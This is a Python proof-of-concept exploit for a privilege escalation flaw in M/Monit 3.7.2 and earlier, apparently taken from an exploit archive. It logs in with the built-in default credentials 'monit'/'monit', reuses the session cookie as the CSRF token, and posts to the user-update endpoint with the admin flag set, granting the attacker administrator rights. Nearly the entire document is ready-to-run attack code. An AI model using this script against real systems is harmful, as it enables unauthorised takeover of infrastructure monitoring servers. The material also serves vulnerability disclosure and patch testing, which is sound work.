
"""
	Vulnerability title: M/Monit <= 3.7.2 - Privilege Escalation
	Author: Dolev Farhi
	Vulnerable version: 2.0.151021	
 	Link: https://mmonit.com
 	Date: 2/17/2019
"""

import sys
import requests

MMONIT_URL  = &#039;http://ip.add.re.ss:8080&#039;
MMONIT_USER = &#039;monit&#039; # Default built in unprivileged user
MMONIT_PASS = &#039;monit&#039;

s = requests.Session()

s.get(MMONIT_URL + &#039;/&#039;)

resp = s.post(MMONIT_URL + &#039;/z_security_check&#039;, params={&#039;z_username&#039;:MMONIT_USER,&#039;z_password&#039;:MMONIT_PASS})

if &#039;Invalid username and/or password&#039; in resp.text:
	print(&#039;Error logging in&#039;)  
	sys.exit(1)


zessionid = s.cookies.get_dict()[&#039;zsessionid&#039;]

headers = {
		&#039;CSRFToken&#039;:zessionid,
}

resp = s.post(MMONIT_URL + &#039;/admin/users/update&#039;,  
					headers=headers, 
					params={&#039;CSRFTOKEN&#039;:zessionid,
							&#039;fullname&#039;:&#039;john doe&#039;,
							&#039;password&#039;:MMONIT_USER,
							&#039;title&#039;:&#039;&#039;,
							&#039;email&#039;:&#039;&#039;,
							&#039;phone&#039;:&#039;&#039;,
							&#039;mobile&#039;:&#039;&#039;,
							&#039;imname&#039;:&#039;&#039;,
							&#039;uname&#039;:MMONIT_PASS,
							&#039;imtype&#039;:None,
							&#039;admin&#039;:&#039;on&#039;,
							&#039;oldpassword&#039;:&#039;D9CFD4AF77E33817DE2160E0C1C7607C&#039;
							})

if resp.status_code == 200:
	print(&#039;Success! You are now M/Monit admin&#039;)
else:
	print(&#039;Something went wrong&#039;)

